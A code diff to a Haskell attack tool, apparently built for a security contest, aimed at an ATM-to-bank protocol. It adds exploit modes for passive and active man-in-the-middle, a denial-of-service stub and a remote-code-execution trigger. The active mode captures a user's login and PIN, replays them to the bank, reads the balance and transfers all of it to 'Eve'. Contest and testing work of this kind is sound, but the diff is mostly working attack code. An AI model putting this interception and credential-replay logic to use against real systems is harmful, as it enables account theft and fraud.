@@ -20,6 +20,8 @@ import Data.Word
 import Network
 import Network.Socket.ByteString
 import System.Environment
+import System.Exit
+import System.Timeout
 import System.IO
 import qualified Data.ByteString as B
 import qualified Data.ByteString.Char8
@@ -34,15 +36,42 @@ bsToString = map (chr . fromIntegral) . B.unpack
 port = PortNumber . fromIntegral
 unPort (PortNumber x) = x
 
-main = withSocketsDo $ fmap (map readMaybe) getArgs >>= main'
+showHelp = do
+    name <- getProgName
+    putStrLn $ "Usage: " ++ name ++ "EXPLOIT_NAME ATM_PORT BANK_PORT"
+    putStrLn $ "EXPLOIT_NAME = PassiveMITM | ActiveMITM | ExceptionDOS | RCE"
+    exitFailure
 
-main' [Just atmPort, Just bankPort] = main'' (port atmPort) (port bankPort)
-main' _ = getProgName >>= \name -> putStrLn $ "Usage: " ++ name ++ " ATM_PORT BANK_PORT"
+main = withSocketsDo $ getArgs >>= main'
 
-main'' atmPort bankPort = do
+validatePorts atmPort bankPort = (atmPort', bankPort') where
+    atmPort' = maybe (error "Failed to parse atmPort") port $ readMaybe atmPort
+    bankPort' = maybe (error "Failed to parse bankPort") port $ readMaybe bankPort
+
+main' ["PassiveMITM", atmPort', bankPort'] = do
+    let (atmPort, bankPort) = validatePorts atmPort' bankPort'
     listener <- listenOn atmPort
-    --handshakeExploit bankPort
+    forever $ accept listener >>= forkIO . doMitm bankPort False
+
+main' ["ActiveMITM", atmPort', bankPort'] = do
+    let (atmPort, bankPort) = validatePorts atmPort' bankPort'
+    listener <- listenOn atmPort
     forever $ accept listener >>= forkIO . doMitm bankPort True
+
+main' ["ExceptionDOS", atmPort', bankPort'] = do
+    let (_, bankPort) = validatePorts atmPort' bankPort'
+    -- TODO: merge brian's exploit code
+    return ()
+
+main' ["RCE", atmPort', bankPort'] = do
+    let (_, bankPort) = validatePorts atmPort' bankPort'
+    handshakeExploit bankPort
+
+main' (unrecognized:_) = do
+    putStrLn $ "Unrecognized exploit name: " ++ unrecognized
+    showHelp
+
+main' _ = showHelp
 
 dumbProxy atm bank logTo logFrom = loop where
     bufferSize = 4096
@@ -254,34 +283,40 @@ frontRunLogin bankPort username pin = do
     let enc = cfbEncrypt aes aesIV
     let dec = cfbDecrypt aes aesIV
     let sendAction a = do
-        putStr "Sending: " >> print a
+        --putStr "Sending: " >> print a
         a' <- serializeAction a
         --print a'
         let a'' = enc a'
         --print a''
         putFlush a''
-    let getAction = do
+    let getAction k = do
         tmp <- B.hGetSome bank bufferSize
         --print tmp
         let tmp' = dec tmp
-        print tmp'
+        --print tmp'
         let r = deserializeAction tmp'
-        print r
-        return r
+        --print r
+        case r of
+            Nothing -> return ()
+            Just r' -> k r'
     let updateAction a f = fmap f $ nextNonce a
     newNonce <- makeNonce
     let a1 = Action username pin rawNonce newNonce Login 0 ""
     sendAction a1
-    Just r1 <- getAction
-    a2 <- updateAction r1 $ (\a -> a {actCmd = Balance})
-    sendAction a2
-    Just r2 <- getAction
-    a3 <- updateAction r2 $ (\a -> a {actCmd = Transfer, actRecipient = "Eve", actAmount = actAmount r2})
-    sendAction a3
-    Just r3 <- getAction
-    a4 <- updateAction r3 $ (\a -> a {actCmd = Logout})
-    sendAction a4
-    Just r4 <- getAction
+    getAction $ \r1 -> do
+        a2 <- updateAction r1 $ (\a -> a {actCmd = Balance})
+        sendAction a2
+        getAction $ \r2 -> do
+            let f = (\a -> a {actCmd = Transfer, actRecipient = "Eve", actAmount = actAmount r2})
+            a3 <- updateAction r2 f
+            sendAction a3
+            getAction $ \r3 -> do
+                a4 <- updateAction r3 $ (\a -> a {actCmd = Logout})
+                sendAction a4
+                getAction $ \r4 -> if actCmd r4 == Malformed
+                    then putStrLn "Transfer failed"
+                    else putStrLn "Transfer successful"
+
     return ()
 
 passiveMitm atm bank logTo logFrom aes aesIv intercept = dumbProxy atm bank (wrap logTo) (wrap logFrom) where
@@ -293,7 +328,7 @@ passiveMitm atm bank logTo logFrom aes aesIv intercept = dumbProxy atm bank (wra
             Just action -> do
                 log (stringToBS $ show action)
                 --replaceLogoutWithDeposit aes aesIv action ctxt
-                intercept action
+                timeout (5*10^6) $ intercept action
                 return ctxt
             _ -> do
                 log ptxt
@@ -308,6 +343,7 @@ doMitm bankPort active (atm, host, atmPort) = do
     let logFrom = log (unPort bankPort) atmPort  :: B.ByteString -> IO B.ByteString
     --dumbProxy atm bank logTo logFrom
     let intercept action = if not active then return () else do
-        frontRunLogin bankPort (actUser action) (actPin action)
+        when (actCmd action == Login && B.length (actPin action) > 0) $ do
+            frontRunLogin bankPort (actUser action) (actPin action)
     (aes, aesIV) <- mitmHandshake atm bank logTo logFrom
     passiveMitm atm bank logTo logFrom aes aesIV intercept
